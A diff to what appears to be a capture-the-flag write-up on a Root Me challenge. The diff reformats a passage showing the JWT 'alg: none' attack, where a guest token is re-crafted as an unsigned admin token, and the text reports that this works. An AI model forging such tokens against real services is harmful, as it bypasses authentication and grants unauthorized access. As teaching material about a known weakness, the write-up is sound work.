@@ -62,12 +62,16 @@ To avoid this type of Pr0bL3m, do not use 'none' algorithm.
 
 What if we decided to change the algorithm to 'none' in the header part in order to exploit the previous vulnerability ? Let us try the following on a Root Me challenge...
 
+```diff
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
-<br/> {"typ":"JWT","alg":"HS256"}.{"username":"guest"}.'a signature crafted using a secret unknown to us'
+{"typ":"JWT","alg":"HS256"}.{"username":"guest"}.'a signature crafted using a secret unknown to us'
+```
 
 We can craft our own JWT :
-<br/> eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
-<br/> {"typ":"JWT","alg":"none"}.{"username":"admin"}.
+```diff
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
+{"typ":"JWT","alg":"none"}.{"username":"admin"}.
+```
 
 Works !
 
